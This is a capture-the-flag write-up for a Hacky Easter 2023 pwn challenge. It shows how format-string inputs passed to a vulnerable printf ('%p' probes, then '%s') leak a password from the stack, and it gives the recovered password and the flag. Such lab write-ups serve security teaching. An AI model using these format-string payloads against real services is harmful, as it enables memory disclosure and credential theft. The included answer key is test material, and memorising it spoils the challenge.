Thumper's PWN - Ring 3
=============

Difficulty: medium

Tags: pwn

Description
-------------
Thumper has been hunting his nemesis, Dr. Evil, for months. He finally located his remote system and is trying to gain access. Can you help him find the right password?

Target: `nc ch.hackyeaster.com 2313`

Note: The service is restarted every hour at x:00.


Solution
-------------
There is an exploit in the `printf` function in C where if you have more tokens passed in than variables to print, it will continue to pop values off the stack and print them.

You can enter the a malicious string as the password, and when it calls printf to show you what faied, it will execute that string with the values on the stack.

Passing `AAAABBBB %p %p %p %p %p %p %p %p` showed the values of the first 8 values on the stack, and the 8th value was the hex representation of the `AAAABBBB` input.

You can then pass `%s` instead of `%p` to print the string at that address in memory. Passing `AAAABBBB %p %p %p %p %p %p %s %p` gave the output:
```Nope..
AAAABBBB 0x7f7a6fc6a7e3 0x7f7a6fc6b8c0 0x7f7a6f98e104 0x6 0x7f7a6fe934c0 (nil) 5uP3R_s3cUr3_PW
 0x4242424241414141
is incorrect. Better luck next time
```

Once you enter `5uP3R_s3cUr3_PW` as the password, you get the response:
```
Access granted, here is your flag:

he2023{w3lc0m3_t0_r1ng_3_thump3r}
```

Flag
-------------
`he2023{w3lc0m3_t0_r1ng_3_thump3r}`